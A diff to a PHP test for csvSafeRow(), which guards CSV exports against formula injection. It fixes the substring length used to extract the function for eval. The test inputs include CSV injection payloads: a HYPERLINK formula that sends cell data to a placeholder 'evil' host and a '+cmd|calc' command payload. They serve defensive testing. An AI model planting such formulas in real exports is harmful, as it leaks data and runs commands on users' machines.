@@ -1,7 +1,7 @@
 <?php
 // MSP-DS-69: every module CSV export writes data rows through csvSafeRow().
 require __DIR__ . '/lib/ds_src.php';
-$f = ds_src('functions.php'); $i = strpos($f, 'function csvSafeRow'); eval(substr($f, $i, strpos($f, "\n}\n", $i) + 2));
+$f = ds_src('functions.php'); $i = strpos($f, 'function csvSafeRow'); eval(substr($f, $i, strpos($f, "\n}\n", $i) + 2 - $i));
 $r = csvSafeRow(['=HYPERLINK("https://evil/?d="&A2,"x")', '+cmd|calc', '-2+3', '@SUM(A1)', "\tx", "\rx", 'Acme', '-5', 42, -3.5, null, '', '1234', '=1+1']);
 ds_t('formula cells are prefixed', $r[0][0] === "'" && $r[1][0] === "'" && $r[2] === "'-2+3" && $r[3][0] === "'" && $r[4][0] === "'" && $r[5][0] === "'" && $r[13] === "'=1+1");
 ds_t('plain text, numbers, negatives, null untouched', $r[6] === 'Acme' && $r[7] === '-5' && $r[8] === 42 && $r[9] === -3.5 && $r[10] === null && $r[11] === '' && $r[12] === '1234');
